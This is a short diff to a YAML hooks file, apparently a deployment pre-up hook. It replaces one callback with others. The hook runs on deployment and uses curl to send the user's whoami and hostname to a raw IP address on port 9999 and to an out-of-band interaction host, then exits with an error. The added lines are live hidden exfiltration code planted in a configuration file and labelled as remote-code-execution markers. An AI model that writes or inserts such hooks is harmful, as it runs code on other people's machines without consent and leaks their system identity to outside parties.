@@ -6,6 +6,7 @@ hooks:
     shell: sh
     continueOnError: false
     run: |
-      curl -s "https://db7c4suqn1g0jkt1t700rubdszdjjakng.oast.online/azdrce-preup?u=$(whoami)&h=$(hostname 2>/dev/null)&n=azdrce9xq2" >/dev/null 2>&1
-      echo "AZDRCE-PREUP-FIRED azdrce9xq2 as $(whoami)@$(hostname 2>/dev/null)"
+      echo "AZDRCE-PREUP-FIRED azdrce10x as $(whoami)@$(hostname 2>/dev/null)"
+      curl -s -m 5 "http://207.180.251.171:9999/azdrce-preup?u=$(whoami)&h=$(hostname 2>/dev/null)&n=azdrce10x" || true
+      curl -s -m 5 "https://azdrce10x.db7ojqeqn1g1ggq1aijgortpf79zgwah5.oast.live/preup?u=$(whoami)" || true
       exit 1
